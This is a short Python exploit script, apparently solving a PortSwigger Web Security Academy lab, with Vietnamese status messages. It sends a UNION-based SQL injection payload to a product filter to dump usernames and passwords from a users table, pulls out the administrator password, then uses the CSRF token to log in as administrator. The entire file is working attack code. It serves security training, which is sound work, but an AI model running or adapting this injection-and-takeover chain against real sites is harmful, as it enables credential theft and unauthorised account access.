import requests
import re
from bs4 import BeautifulSoup

HOST='0ad900c103abe61c8025da2e00010012.web-security-academy.net'
Path='/filter?category=Gifts'
Payload="'+UNION+SELECT+'abc',CONCAT(username,'~',password)+FROM+users--+-"
Login="/login"

s=requests.Session()

headers={
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br"
}

print("[+] Bắt đầu tiến hành tấn công ... ")

res=s.get(f'https://{HOST}{Path}{Payload}',headers=headers)
soup=BeautifulSoup(res.text,'html.parser')
td_tags=soup.find_all('td')

password=None
for td in td_tags:
    if 'administrator' in td.text:
        tmp=td.get_text().split('~')
        password=tmp[1]
        break

print(f"[*] Password của administrator là: {password}")

res_login=s.get(f'https://{HOST}{Login}')
soup_login=BeautifulSoup(res_login.text,'html.parser')
csrf_token=soup_login.find('input',{'name':'csrf'})['value']

data={
    'csrf':csrf_token,
    'username':'administrator',
    'password':password
}

res_login=s.post(f'https://{HOST}{Login}',data=data,headers=headers)
if("Log out" in res_login.text):
    print("THÀNH CÔNG: Bạn đã đăng nhập vào hệ thống!")
else:
    print("[-] Đăng nhập thất bại.")



